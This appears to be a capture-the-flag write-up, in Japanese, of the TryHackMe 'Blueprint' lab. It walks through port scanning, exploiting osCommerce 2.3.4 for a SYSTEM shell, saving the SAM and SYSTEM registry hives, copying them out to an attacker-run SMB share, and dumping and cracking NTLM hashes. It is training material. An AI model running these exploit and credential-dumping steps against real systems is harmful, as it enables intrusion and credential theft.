# Blueprint CTF

https://tryhackme.com/room/blueprint

## Enumeration

### ポートスキャン

```shell
TARGET=10.10.67.164
root@ip-10-10-186-97:~# sudo nmap -sT -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-03-12 05:14 GMT
Nmap scan report for 10.10.67.164
Host is up (0.042s latency).
Not shown: 65522 closed ports
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
443/tcp   open  https
445/tcp   open  microsoft-ds
3306/tcp  open  mysql
8080/tcp  open  http-proxy
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49158/tcp open  unknown
49159/tcp open  unknown
49160/tcp open  unknown
MAC Address: 02:7B:24:5B:31:BB (Unknown)

root@ip-10-10-186-97:~# sudo nmap -sV -p80,135,139,443,445,3306,8080,49152,49153,49154,49158,49159,49160 $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-03-12 05:17 GMT
Nmap scan report for 10.10.67.164
Host is up (0.019s latency).

PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 7.5
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
443/tcp   open  ssl/http     Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3306/tcp  open  mysql        MariaDB (unauthorized)
8080/tcp  open  http         Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49158/tcp open  msrpc        Microsoft Windows RPC
49159/tcp open  msrpc        Microsoft Windows RPC
49160/tcp open  msrpc        Microsoft Windows RPC
MAC Address: 02:7B:24:5B:31:BB (Unknown)
Service Info: Hosts: www.example.com, BLUEPRINT, localhost; OS: Windows; CPE: cpe:/o:microsoft:windows
```

### 8080 port

http://10.10.67.164:8080/oscommerce-2.3.4/

oscommerce というソリューションを使っていることが分かった。

脆弱性検索

```shell
osCommerce 2.3.4 - Multiple Vulnerabilities                                       | php/webapps/34582.txt
osCommerce 2.3.4.1 - 'currency' SQL Injection                                     | php/webapps/46328.txt
osCommerce 2.3.4.1 - 'products_id' SQL Injection                                  | php/webapps/46329.txt
osCommerce 2.3.4.1 - 'reviews_id' SQL Injection                                   | php/webapps/46330.txt
osCommerce 2.3.4.1 - 'title' Persistent Cross-Site Scripting                      | php/webapps/49103.txt
osCommerce 2.3.4.1 - Arbitrary File Upload                                        | php/webapps/43191.py
osCommerce 2.3.4.1 - Remote Code Execution                                        | php/webapps/44374.py
osCommerce 2.3.4.1 - Remote Code Execution (2)                                    | php/webapps/50128.py
```

RCE スクリプト使用

```shell
$ python3 ./50128.py http://10.10.67.164:8080/oscommerce-2.3.4/catalog
[*] Install directory still available, the host likely vulnerable to the exploit.
[*] Testing injecting system command to test vulnerability
User: nt authority\system

RCE_SHELL$ whoami
nt authority\system
```

System シェル取得成功

```shell
RCE_SHELL$ dir c:\\Users\\Administrator\\Desktop
 Volume in drive C has no label.
 Volume Serial Number is 14AF-C52C

 Directory of c:\Users\Administrator\Desktop

11/27/2019  06:15 PM    <DIR>          .
11/27/2019  06:15 PM    <DIR>          ..
11/27/2019  06:15 PM                37 root.txt.txt
               1 File(s)             37 bytes
               2 Dir(s)  19,448,492,032 bytes free

RCE_SHELL$ type c:\\Users\\Administrator\\Desktop\\root.txt.txt
THM{....................}
```

ルートフラグゲット。

## NTLM ハッシュ

質問に答えるため、Lab ユーザーの NTLM ハッシュを取得する必要がある。

レジストリのエクスポート

```shell
RCE_SHELL$ reg save hklm\sam C:\\Users\\public\\sam.hive
The operation completed successfully.

RCE_SHELL$ reg save hklm\system C:\\Users\\public\\system.hive
The operation completed successfully.
```

ファイル共有設定（kali）

```shell
$ mkdir share
$ python /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support public share
```

コピー実行

```shell
RCE_SHELL$ copy C:\\Users\\public\\sam.hive \\\\10.2.22.182\\\public\\
RCE_SHELL$ copy C:\\Users\\public\\system.hive \\\\10.2.22.182\\public\\
```

パスワードハッシュ抽出

```shell
$ python /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Target system bootKey: 0x147a48de4a9815d2aa479598592b086f
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:549a1bcb88e35dc18c7a0b0168631411:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Lab:1000:aad3b435b51404eeaad3b435b51404ee:<ひみつ>:::
[*] Cleaning up...
```

hashcat でクラック

```shell
hashcat -m 1000 hash.txt .\SecLists\Passwords\Common-Credentials\10-million-password-list-top-1000000.txt
```

## 振り返り

- oscommerce が既成のシステムではとすぐに思いついて脆弱性を検索したのは進歩
- NTLM ハッシュ抽出の良い復習になった

## Tags

#tags:Windows
